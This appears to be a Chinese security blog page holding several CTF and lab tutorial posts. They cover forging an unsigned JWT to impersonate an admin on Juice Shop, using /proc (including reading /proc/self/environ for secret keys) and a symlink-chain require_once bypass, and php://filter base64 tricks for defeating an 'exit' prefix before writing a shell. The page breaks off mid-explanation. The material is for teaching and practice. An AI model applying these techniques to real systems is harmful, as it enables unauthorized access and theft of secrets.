+<p><strong><font style="color:rgb(77, 77, 77);">由于加密方式为空，因此第三部分为空，于是得到篡改后的JWT如下：</font></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0.ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogIiIsCiAgICAiZW1haWwiOiAiYWRtaW5AanVpY2Utc2gub3AiLAogICAgInBhc3N3b3JkIjogImUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNlIiwKICAgICJyb2xlIjogImN1c3RvbWVyIiwKICAgICJkZWx1eGVUb2tlbiI6ICIiLAogICAgImxhc3RMb2dpbklwIjogInVuZGVmaW5lZCIsCiAgICAicHJvZmlsZUltYWdlIjogIi9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwKICAgICJ0b3RwU2VjcmV0IjogIiIsCiAgICAiaXNBY3RpdmUiOiB0cnVlLAogICAgImNyZWF0ZWRBdCI6ICIyMDIyLTExLTE2IDA1OjM5OjQ1LjcwNyArMDA6MDAiLAogICAgInVwZGF0ZWRBdCI6ICIyMDIyLTExLTE2IDA1OjQ0OjA0LjUyMyArMDA6MDAiLAogICAgImRlbGV0ZWRBdCI6IG51bGwKICB9LAogICJpYXQiOiAxNjY4NTc3NDU3LAogICJleHAiOiAxNjY4NTk1NDU3Cn0.</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-验证是否存在漏洞"><a href="#4-验证是否存在漏洞" class="headerlink" title="4. 验证是否存在漏洞"></a><font style="color:rgb(79, 79, 79);">4. 验证是否存在漏洞</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652972360-12122cd0-b112-45dd-b637-dd5aa4b025b6.png"></p>
+<h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5. 漏洞利用"></a><font style="color:rgb(79, 79, 79);">5. 漏洞利用</font></h3><p><font style="color:rgb(77, 77, 77);">修改自己账号的密码，抓包发现，与我当前账户身份相关的只有</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Authorization&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">和</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Cookie&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">的</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;token&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">值，并没有邮箱、用户名之类的东西。那就直接篡改</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653016013-d21af7be-125d-4466-b26e-a7e5d35e1ec2.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653022208-1635f4b7-db00-41bc-9735-5c955e8d8e4b.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653029905-c90410e7-2a92-4c49-b138-0750a168e9a2.png"></p>
+<h2 id="案例2：BurpSuite"><a href="#案例2：BurpSuite" class="headerlink" title="案例2：BurpSuite"></a><font style="color:rgb(79, 79, 79);">案例2：BurpSuite</font></h2><h3 id="案例2-1：接受任意签名"><a href="#案例2-1：接受任意签名" class="headerlink" title="案例2.1：接受任意签名"></a><font style="color:rgb(79, 79, 79);">案例2.1：接受任意签名</font></h3><p><strong><font style="color:rgb(77, 77, 77);">漏洞靶场：通过未验证签名绕过 JWT 身份验证（</font></strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature"><font style="color:rgb(77, 77, 77);">JWT authentication bypass via unverified signature</font></a><strong><font style="color:rgb(77, 77, 77);">）</font></strong><font style="color:rgb(77, 77, 77);"><br></font><font style="color:rgb(77, 77, 77);">本实验使用基于 JWT 的机制来处理会话。由于实施缺陷，服务器不会验证它收到的任何 JWT 的签名。</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653219660-0c781b9c-887b-465d-9218-474fdd697419.png"></p>
+<h3 id="案例2-2：接受未签名的令牌"><a href="#案例2-2：接受未签名的令牌" class="headerlink" title="案例2.2：接受未签名的令牌"></a><font style="color:rgb(79, 79, 79);">案例2.2：接受未签名的令牌</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653310635-c161d89f-f7ef-4cb7-8f3c-2aaf148a376c.png"></p>
+<h3 id="案例2-3：暴力破解密钥"><a href="#案例2-3：暴力破解密钥" class="headerlink" title="案例2.3：暴力破解密钥"></a><font style="color:rgb(79, 79, 79);">案例2.3：暴力破解密钥</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653373531-f16fd88b-b0ff-4cf1-a2ef-b45e4cfde56f.png"></p>
+<h3 id="案例2-5：jku参数注入攻击"><a href="#案例2-5：jku参数注入攻击" class="headerlink" title="案例2.5：jku参数注入攻击"></a><font style="color:rgb(79, 79, 79);">案例2.5：jku参数注入攻击</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653912686-c5a2277d-36bc-427c-9f67-27004ec6a361.png"></p>
+<h3 id="案例2-6：kid参数注入攻击"><a href="#案例2-6：kid参数注入攻击" class="headerlink" title="案例2.6：kid参数注入攻击"></a><font style="color:rgb(79, 79, 79);">案例2.6：kid参数注入攻击</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653945214-1571053c-cdd5-443f-9015-46226c955385.png"></p>
+<h3 id="案例2-7：算法混淆攻击"><a href="#案例2-7：算法混淆攻击" class="headerlink" title="案例2.7：算法混淆攻击"></a><font style="color:rgb(79, 79, 79);">案例2.7：算法混淆攻击</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653977895-c253f15a-5d7b-4fc4-b3b1-c3014e2f5fc9.png"></p>
+<h3 id="案例2-8：从现有令牌派生公钥"><a href="#案例2-8：从现有令牌派生公钥" class="headerlink" title="案例2.8：从现有令牌派生公钥"></a><font style="color:rgb(79, 79, 79);">案例2.8：从现有令牌派生公钥</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726654018471-5fa494ce-afca-4560-a393-5825f3a0cdc5.png"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2025/03/31/JWT%E6%94%BB%E5%87%BB/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-[CTF]proc目录的应用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/03/31/%5BCTF%5Dproc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/">[CTF]proc目录的应用</a>
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/%5BCTF%5Dproc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:03:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="proc目录的运用"><a href="#proc目录的运用" class="headerlink" title="proc目录的运用"></a>proc目录的运用</h2><h3 id="proc目录"><a href="#proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h3><p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p>
+<p>简单来讲，<code>/proc</code> 目录即保存在系统内存中的信息，大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。</p>
+<p>&#x2F;proc 目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号(PID)，里面包含对应进程相关的多个信息文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/[CTF]proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/1742193363519-219aa542-2f3b-4379-897a-603201df55e4.png"></p>
+<p>每一个进程对应许多相关文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/[CTF]proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/1742193363459-3da93db0-0e51-4066-bbd3-d8b46e0a6326.png"></p>
+<p>一些常见的进程文件：</p>
+<h4 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h4><p>cmdline 文件存储着启动当前进程的完整命令，但<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B&spm=1001.2101.3001.7020">僵尸进程</a>目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/2889/cmdline</span><br></pre></td></tr></table></figure>
+
+<h4 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=cwd&spm=1001.2101.3001.7020">cwd</a></h4><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录（也就是这个是在那个目录下执行的）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289/cwd</span><br></pre></td></tr></table></figure>
+
+<p>之后我们可以使用ls查看该运行目录下的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/1289/cwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h4><p>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289/exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/[CTF]proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/1742193571672-7d183f38-c7b4-4b3e-98a0-19e29c4556ae.png"></p>
+<h4 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h4><p>environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/2889/environ</span><br></pre></td></tr></table></figure>
+
+<p>常用以读取环境变量中的SECRET_KEY或FLAG</p>
+<h4 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h4><p>fd 是一个目录，里面包含着当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。</p>
+<p>查看指定进程打开的某个文件的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289/fd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/[CTF]proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/1742193363608-7e1e2c5c-8799-4b9f-b7fe-ea98adc80057.png"></p>
+<p>查看指定进程打开的某个文件的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289/fd/4</span><br></pre></td></tr></table></figure>
+
+<p><strong>在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p>
+<h4 id="self"><a href="#self" class="headerlink" title="self"></a>self</h4><p><code>/proc/self</code> 表示当前进程目录。我们可以通过<code>/proc/$pid/</code>来获取指定进程的信息，这个方法需要知道进程pid。为了更方便的获取本进程的信息，linux提供了<code>/proc/self</code>目录，等价于<code>/proc/本进程pid</code>。</p>
+<ul>
+<li>获取当前启动进程的完整命令：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/cmdline</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取目标当前进程环境的运行目录与目录里的文件：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/self/cwd</span><br><span class="line">ls /proc/self/cwd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取当前进程的可执行文件的完整路径：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/self/exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取当前进程的环境变量</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/environ</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取当前进程打开的文件内容</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/fd/&#123;id&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP文件包含：使用多级软链接绕过文件判断"><a href="#PHP文件包含：使用多级软链接绕过文件判断" class="headerlink" title="PHP文件包含：使用多级软链接绕过文件判断"></a>PHP文件包含：使用多级软链接绕过文件判断</h3><p>如何通过require_once来多次包含同一个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &#x27;/www/config.php&#x27;;</span><br><span class="line">// some logic here...</span><br><span class="line">require_once $_GET[&#x27;file&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>场景描述：我们在审计时找到一处<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">文件包含漏洞</a>（使用require_once或include_once），想利用这个漏洞读取一下数据库配置文件之类的源码，通常可以使用<code>php://filter/convert.base64-encode/resource=file</code>这样的方式将文件以base64的形式读出来。但如果这个文件在前面已经被包含过了，则第二次包含就会失败，即使使用<code>php://filter</code>也一样。</p>
+<p>此时我们可以使用“多重软连接”，正常情况下，PHP会将用户输入的文件名进行resolve，转换成标准的绝对路径，这个转换的过程会将…&#x2F;、.&#x2F;、软连接等都进行计算，得到一个最终的路径，再进行包含。每次包含都会经历这个过程，所以，只要是相同的文件，不管中间使用了…&#x2F;进行跳转，还是使用软连接进行跳转，都逃不过最终被转换成原始路径的过程，也就绕不过require_once。</p>
+<p>但是，如果软连接跳转的次数超过了某一个上限，Linux的lstat函数就会出错，导致PHP计算出的绝对路径就会包含一部分软连接的路径，也就和原始路径不相同的，即可绕过require_once限制。 在Linux下，最常见的软连接就是&#x2F;proc&#x2F;self&#x2F;root，这个路径指向根目录。所以，我们可以多次使用这个路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &#x27;/www/config.php&#x27;;</span><br><span class="line">include_once &#x27;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/www/config.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>这样即可包含两次&#x2F;www&#x2F;config.php。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2025/03/31/%5BCTF%5Dproc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-phpfilter死亡绕过---base64过滤字符" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/">phpfilter死亡绕过---base64过滤字符</a>
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:03:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h3 id="核心思路—构造垃圾字符，base64过滤掉"><a href="#核心思路—构造垃圾字符，base64过滤掉" class="headerlink" title="核心思路—构造垃圾字符，base64过滤掉"></a>核心思路—构造垃圾字符，base64过滤掉</h3><h3 id="base64特性介绍"><a href="#base64特性介绍" class="headerlink" title="base64特性介绍"></a>base64特性介绍</h3><p>base64解码时候会去掉非其码表中的字符</p>
+<p>编码时简单来说是遵循3变4原则，缺就补&#x3D;</p>
+<p>例如：</p>
+<blockquote>
+<p>chu012345一次编码之后：Y2h1MDEyMzQ1</p>
+<p>两次编码之后：WTJoMU1ERXlNelEx  </p>
+<p>&#x2F;&#x2F;此时我们在WTJoMU1ERXlNelEx前面加上字符串1aji，变成如下字符</p>
+<p>lajiWTJoMU1ERXlNelEx</p>
+</blockquote>
+<p>此时我们进行两次base64解码，结果如下：</p>
+<p><img src="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741588367334-5875a595-06b0-482d-be57-4d3f29064014.png"></p>
+<p>可以发现，我们成功剔除了laji这一段干扰字符，关于字符串的补位也需要根据垃圾字符的解码结果而定，若垃圾字符的解码结果依然包含码表字符，则也需要对码表字符进行处理。</p>
+<h3 id="构造乱码"><a href="#构造乱码" class="headerlink" title="构造乱码"></a>构造乱码</h3><p>利用utf-8，utf-16le构造乱码</p>
+<p>utf-8 –&gt;utf-16le:</p>
+<p><img src="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741590104142-497b8a2b-8b14-4caa-a0ed-3ef15a4cd8ae.png"></p>
+<p>观察上述代码，我们可以发现将编码格式转换之后，字符的长度增加了6，这是因为在utf-8转换为utf-16le的时候会在每一个字符后边增加一个不可见字符</p>
+<p>utf-l6le –&gt; utf-8:</p>
+<p><img src="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741590083149-777a87dd-534b-457f-9ebd-1f2cc9bda69d.png"></p>
+<p><img src="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741590056771-f26686ed-e9d1-4d5f-9707-bd796dc0e1ba.png"></p>
+<p>再查看这段代码运行结果，我们就可以得到，在utf-16le编码转换为utf-8编码的时候，增加了\0这个不可见字符，再反解码的时候，只有带有\0的字符才会被转换，没有\0的就会被转换为乱码，至此，我们就可以成功构造乱码哩</p>
+<p>举例：</p>
+<p><img src="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741591065494-4ea93d79-41fa-4655-8f58-0d016dcb0230.png"></p>
+<p><img src="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1741591081503-7f5d3d60-2109-4875-a945-c79af9d93d28.png"></p>
+<h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><ol>
+<li>convert.base64</li>
+</ol>
+<p><code>convert.base64-encode</code>和 <code>convert.base64-decode</code>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p>
+<ol start="2">
+<li>convert.quoted</li>
+</ol>
+<blockquote>
+<p><font style="color:rgb(44, 44, 54);">这种编码方法允许数据以一种几乎完全由可打印ASCII字符组成的格式进行传输，同时尽量保持数据的原始形式。</font></p>
+<p><font style="color:rgb(44, 44, 54);"></font></p>
+<p><font style="color:rgb(44, 44, 54);">Quoted-Printable 编码规则相对简单：</font></p>
+<p><font style="color:rgb(44, 44, 54);">大多数可打印的ASCII字符（除了等号 &#x3D; 和空白字符）保持不变。</font></p>
+<p><font style="color:rgb(44, 44, 54);">空白字符（如空格和制表符）在行尾时会被编码，以防它们在邮件传输过程中被修改或丢失。</font></p>
+<p><font style="color:rgb(44, 44, 54);">所有非ASCII字符以及一些特定的ASCII字符（如等号 &#x3D;）会被编码为 &#x3D;XX 的形式，其中 XX 是该字符的十六进制ASCII值2。</font></p>
+</blockquote>
+<p><code>convert.quoted-printable-encode</code>和<code>convert.quoted-printable-decode</code>使用此过滤器的<code>decode</code>版本等同于用 <code>quoted_printable_decode()</code>函数处理所有的流数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// 假设这是从邮件中接收到的 Quoted-Printable 编码的字符串</span></span><br><span class="line">  <span class="variable">$encodedStr</span> = <span class="string">&quot;I=0Alove=0AShanghai!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对字符串进行解码</span></span><br><span class="line"><span class="variable">$decodedStr</span> = <span class="title function_ invoke__">quoted_printable_decode</span>(<span class="variable">$encodedStr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出解码后的字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decodedStr</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I</span><br><span class="line">love</span><br><span class="line">Shanghai!</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="3">
+<li>convert.iconv.*</li>
+</ol>
+<p>这个过滤器需要<code>php</code>支持 <code>iconv</code> ，而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
+<p><code>iconv</code> — 字符串按要求的字符编码来转换</p>
+<p>convery.iconv.*的使用有两种方法:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
+
+<p>支持的字符编码有一下几种（详细参考<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">UCS-<span class="number">4</span>*</span><br><span class="line">UCS-<span class="number">4</span>BE</span><br><span class="line">UCS-<span class="number">4</span>LE*</span><br><span class="line">UCS-<span class="number">2</span></span><br><span class="line">UCS-<span class="number">2</span>BE</span><br><span class="line">UCS-<span class="number">2</span>LE</span><br><span class="line">UTF-<span class="number">32</span>*</span><br><span class="line">UTF-<span class="number">32</span>BE*</span><br><span class="line">UTF-<span class="number">32</span>LE*</span><br><span class="line">UTF-<span class="number">16</span>*</span><br><span class="line">UTF-<span class="number">16</span>BE*</span><br><span class="line">UTF-<span class="number">16</span>LE*</span><br><span class="line">UTF-<span class="number">7</span></span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-<span class="number">8</span>*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="绕过死亡exit"><a href="#绕过死亡exit" class="headerlink" title="绕过死亡exit"></a>绕过死亡exit</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。那么这种情况下，如何绕过这个<code>“死亡exit”</code>？</p>
+<p>思路其实也很简单我们只要将<code>content</code>前面的那部分内容使用某种手段（编码等）进行处理，导致<code>php</code>不能识别该部分就可以了。</p>
+<p>这里的<code>$_POST[‘filename’]</code>是可以控制协议的.</p>
+<h4 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h4><p>当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用<code>php://filter/write=convert.base64-decode</code>来首先对其解码。在解码的过程中，字符<code>&lt; ? ; &gt;</code>空格等一共有7个字符不符合<code>base64</code>编码的字符范围将被忽略，所以最终被解码的字符仅有<code>”phpexit”</code>和我们传入的其他字符。</p>
